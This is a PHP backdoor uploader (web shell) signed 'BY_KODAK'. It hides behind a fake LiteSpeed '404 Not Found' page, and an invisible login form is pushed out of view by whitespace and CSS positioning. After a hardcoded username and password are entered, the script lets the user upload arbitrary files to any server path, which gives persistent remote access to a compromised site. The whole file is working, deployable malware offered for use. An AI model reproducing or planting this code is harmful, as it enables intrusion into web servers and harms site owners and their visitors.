<?php
//BY_KODAK
session_start();
// ***************************************** //
// **********	DECLARE VARIABLES  ********** //
// ***************************************** //




// ****************************************************** Change username and password ******************************************************
$username = 'Kodak';
$password = '@k0d4k';
// ****************************************************** Change username and password ******************************************************



$random1 = 'HAHAHAHA';
$random2 = 'HEHEHEHE';
$hash = md5($random1.$password.$random2);


// ************************************ //
// **********	USER LOGOUT  ********** //
// ************************************ //
if(isset($_GET['logout']))
{
	unset($_SESSION['login']);
}
// ******************************************* //
// **********	USER IS LOGGED IN	********** //
// ******************************************* //
if (isset($_SESSION['login']) && $_SESSION['login'] == $hash) {
	?>
	
		<style>
		body{background: black;text-align: center;color:#6AFE7C;font-size :25px}
		</style>
		
		<center>
		<p style='color:#EAA50E' >Hello <?php echo $username; ?> :]</p><p style='color:#E6DD28'>You Have Successfully Logged In!</p><br>
		<?php
		$files = @$_FILES["files"];
		if ($files["name"] != '') {
		$fullpath = $_REQUEST["path"] . $files["name"];
		if (move_uploaded_file($files['tmp_name'], $fullpath)) {
		echo "<h2><a style='color:#2DF7FB' href='$fullpath'>OK-Click here!</a></h2>";
		}
		}
		echo '<title>Uploader</title>
		<br><br><form method=POST enctype="multipart/form-data" action="">
		<input type="file" name="files">
		<input type="submit" style="color:#B65CB7" value="..:: Upload ::.."></form>';
		?>
		<br><br><br><br><br><br><br>
		<a href="?logout=true" style='color:red;font-size:17px'>LogOut?</a>
			
	<?php
}
// *********************************************** //
// **********	FORM HAS BEEN SUBMITTED	********** //
// *********************************************** //
else if (isset($_POST['submit'])) {
	if ($_POST['username'] == $username && $_POST['password'] == $password){
	
		//IF USERNAME AND PASSWORD ARE CORRECT SET THE LOG-IN SESSION
		$_SESSION["login"] = $hash;
		header("Location: $_SERVER[PHP_SELF]");
		
	} else {
		
		// DISPLAY FORM WITH ERROR
		display_login_form();
		//echo 'PassWord & UserName Are Incorrect';
		
	}
}	
	
	
// *********************************************** //
// **********	SHOW THE LOG-IN FORM	********** //
// *********************************************** //
else { 
	display_login_form();
}
function display_login_form(){ ?>
																																																																		<style>input[type=text], input[type=password] {	width: 9%;padding: 2px 4px;margin: 2px 0 0px 0;display: inline-block;border: 0px solid #ccc;box-sizing: border-box;padding-top: 0px;font-size: 13px;color:black;position: absolute;margin-top: 585px;left: 1440px;}</style><div align="right"><form action="" method='post'><br><input type="text" style='color:#B4B4B4' placeholder="." name="username" id="username"><br /><input type="password" style='color:#B4B4B4' placeholder="." name="password" id="password"><input type="submit" name="submit" hidden /></form></div>
<!DOCTYPE html>
<html style="height:92.8%">
<head><title> 404 Not Found
</title></head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
<h2 style="margin-top:20px;font-size: 30px;">Not Found
</h2>
<p>The resource requested could not be found on this server!</p>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by  <a style="color:#fff;" href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a><p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>
<?php } ?>
